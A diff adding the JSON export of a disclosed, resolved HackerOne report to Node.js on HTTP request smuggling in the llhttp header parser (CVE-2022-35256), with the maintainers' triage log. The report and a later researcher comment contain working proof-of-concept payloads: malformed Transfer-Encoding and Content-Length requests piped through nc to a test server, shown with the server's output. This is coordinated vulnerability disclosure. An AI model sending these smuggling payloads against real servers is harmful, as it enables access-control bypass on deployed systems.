@@ -1,0 +1,419 @@
+{
+  "id": 1675191,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjc1MTkx",
+  "url": "https://hackerone.com/reports/1675191",
+  "title": "HTTP Request Smuggling Due to Incorrect Parsing of Header Fields",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-20T03:13:30.448Z",
+  "submitted_at": "2022-08-20T03:13:30.523Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vvx7",
+    "url": "/vvx7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bbv64gp7idz3ugwd7gidfhbjqds2/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-35256"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-10-26T08:17:59.080Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-09-26T08:17:52.067Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nThe `llhttp` parser in the `http` module in Node v18.7.0 does not correctly handle header fields that are not terminated with CLRF. This may result in HTTP Request Smuggling.\n\n**Description:** \nThe following chunked request is processed.  It should be rejected as `Transfer-Encoding` header obfuscation may result in HRS when the upstream proxy does not process the `Transfer-Encoding` header.\n\nA header that precedes the `Transfer-Encoding`, contains an empty value, and is not properly delimited with CLRF may be used for TE obfuscation. \n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\nThe request is rejected when the preceding header has a value but improper CLRF.\n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:x\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\n## Steps To Reproduce:\n\nServer\nRun the server: `node app.js`\n\n```js\n// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/\nconst http = require('http');\n\nhttp.createServer((request, response) => {\n  let body = [];\n  request.on('error', (err) => {\n    response.end(\"Request Error: \" + err)\n  }).on('data', (chunk) => {\n        body.push(chunk);\n  }).on('end', () => {\n    body = Buffer.concat(body).toString();\n\n    // log the body to stdout to catch the smuggled request\n    console.log(\"Response\");\n    console.log(request.headers);\n    console.log(body);\n    console.log(\"---\");\n\n    response.on('error', (err) => {\n      // log the body to stdout to catch the smuggled request\n        response.end(\"Response Error: \" + err)\n    });\n\n    response.end(\"Body length: \" + body.length.toString() + \" Body: \" + body);\n  });\n}).listen(5000);\n```\nPayload\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" x:\\nTransfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nOutput\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 02:59:38 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\n```\nNote:\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" Transfer-Encoding: yeet\\r\\n\"\\\n\" Transfer-Encoding: \\n\"\\\n\" Transfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nThis also works with the resulting wonky header:\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 03:06:09 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\nResponse\n{ host: 'localhost:5000', 'transfer-encoding': 'yeet, , chunked' }\nA\n```\n\n## Impact:\n\nHRS can lead to access control bypass and other issues.\n\n## Supporting Material/References:\n{F1875064}\n\n\nhttps://hackerone.com/reports/1501679\nhttps://hackerone.com/reports/1238709\n\n## Impact\n\nHTTP Request Smuggling can lead to access control bypass.",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1875062,
+      "file_name": "CleanShot_2022-08-19_at_23.09.24.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/85anhamky7182hac48d4ssjopg7m?response-content-disposition=attachment%3B%20filename%3D%22CleanShot_2022-08-19_at_23.09.24.png%22%3B%20filename%2A%3DUTF-8%27%27CleanShot_2022-08-19_at_23.09.24.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065914Z&X-Amz-Expires=1840&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d0f39dbc764f1b7eb7b7d65d39b4b4e96d0970276276feca85714e9cdf651feb",
+      "file_size": 195811,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-10-26T08:17:52.185Z",
+  "allow_singular_disclosure_after": -28680082.564367745,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "the_thinking_machine",
+    "shivammusic",
+    "hackwithabhishek1",
+    "azdpsi"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 18053732,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "That's a duplicate of #1665156",
+      "automated_response": false,
+      "created_at": "2022-08-20T03:55:55.726Z",
+      "updated_at": "2022-08-20T03:55:55.726Z",
+      "actor": {
+        "username": "rafaelgss",
+        "cleared": false,
+        "verified": false,
+        "url": "/rafaelgss",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18053734,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugDuplicate",
+      "message": "Duplicate",
+      "automated_response": false,
+      "created_at": "2022-08-20T03:56:48.961Z",
+      "updated_at": "2022-08-20T03:56:48.961Z",
+      "original_report_id": 1665156,
+      "actor": {
+        "username": "rafaelgss",
+        "cleared": false,
+        "verified": false,
+        "url": "/rafaelgss",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18060038,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @rafaelgss ! I think this is a new bug. \n\nCVE-2022-23315 relates to handling of newline bytes in the field-value. Header field-values should only contain optional trailing whitespace and VCHAR (visible ascii characters).  Node accepting a CLRF in the field is an incorrect implementation of the field-value parser.\n\nThis bug is different because it relates to handling of header fields immediately preceding a header such as `Transfer-Encoding`.  When the preceding header is not properly terminated with a CLRF _and_ when the value is empty, node will accept the `Transfer-Encoding` header (or any other header such as `Content-Length`).  It should be rejected as a 400.\n\nHere's a better example for you:\n\nThis is invalid and is rejected.\n`x:a\\nTransfer-Encoding: chunked\\r\\n`\n\nThis is invalid but accepted by latest node release as a valid transfer-encoding.\n`x:\\nTransfer-Encoding: chunked\\r\\n`\n\nLet's look at Content-Length because this may also be abused (along with `Transfer-Encoding`) to achieve HRS.\n\nThis is rejected.  That's good!\n```\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\"X:X\\nContent-Length: 4\\r\\n\"\\\n\"AAAA\\r\\n\"\n\"\\r\\n\" | nc localhost 5000\n```\n\nThis is accepted.  That's borked!\n```\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\"X:\\nContent-Length: 4\\r\\n\"\\\n\"AAAA\\r\\n\"\n\"\\r\\n\" | nc localhost 5000\n```",
+      "automated_response": false,
+      "created_at": "2022-08-21T01:41:41.107Z",
+      "updated_at": "2022-08-21T01:41:41.107Z",
+      "actor": {
+        "username": "vvx7",
+        "cleared": false,
+        "verified": false,
+        "url": "/vvx7",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/bbv64gp7idz3ugwd7gidfhbjqds2/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18076991,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-08-22T13:08:21.051Z",
+      "updated_at": "2022-08-22T13:08:21.051Z",
+      "actor": {
+        "username": "shogunpanda",
+        "cleared": false,
+        "verified": false,
+        "url": "/shogunpanda",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/sYGTTtbcoioPBBRUUH3s1cLY/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18082734,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugReopened",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-08-22T22:03:21.353Z",
+      "updated_at": "2022-08-22T22:03:21.353Z",
+      "actor": {
+        "username": "mcollina",
+        "cleared": false,
+        "verified": false,
+        "url": "/mcollina",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18082738,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-08-22T22:03:30.610Z",
+      "updated_at": "2022-08-22T22:03:30.610Z",
+      "actor": {
+        "username": "mcollina",
+        "cleared": false,
+        "verified": false,
+        "url": "/mcollina",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18342924,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@vvx7 will you want to be credited on the release blog page for this fix?",
+      "automated_response": false,
+      "created_at": "2022-09-12T13:46:52.983Z",
+      "updated_at": "2022-09-12T13:46:52.983Z",
+      "actor": {
+        "username": "vdeturckheim",
+        "cleared": false,
+        "verified": false,
+        "url": "/vdeturckheim",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18342980,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yes, please!  Credit: VVX7",
+      "automated_response": false,
+      "created_at": "2022-09-12T13:54:18.819Z",
+      "updated_at": "2022-09-12T13:54:18.819Z",
+      "actor": {
+        "username": "vvx7",
+        "cleared": false,
+        "verified": false,
+        "url": "/vvx7",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/bbv64gp7idz3ugwd7gidfhbjqds2/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18408074,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-09-16T19:57:44.895Z",
+      "updated_at": "2022-09-16T19:57:44.895Z",
+      "cve_ids": [
+        "CVE-2022-35256"
+      ],
+      "actor": {
+        "username": "vdeturckheim",
+        "cleared": false,
+        "verified": false,
+        "url": "/vdeturckheim",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18526464,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-09-26T08:17:03.406Z",
+      "updated_at": "2022-09-26T08:17:03.406Z",
+      "actor": {
+        "username": "vdeturckheim",
+        "cleared": false,
+        "verified": false,
+        "url": "/vdeturckheim",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "vvx7",
+        "url": "/vvx7"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18526541,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-09-26T08:17:52.099Z",
+      "updated_at": "2022-09-26T08:17:52.099Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "vdeturckheim",
+        "cleared": false,
+        "verified": false,
+        "url": "/vdeturckheim",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 18960536,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-26T08:17:59.313Z",
+      "updated_at": "2022-10-26T08:17:59.313Z",
+      "actor": {
+        "url": "/nodejs",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Node.js"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
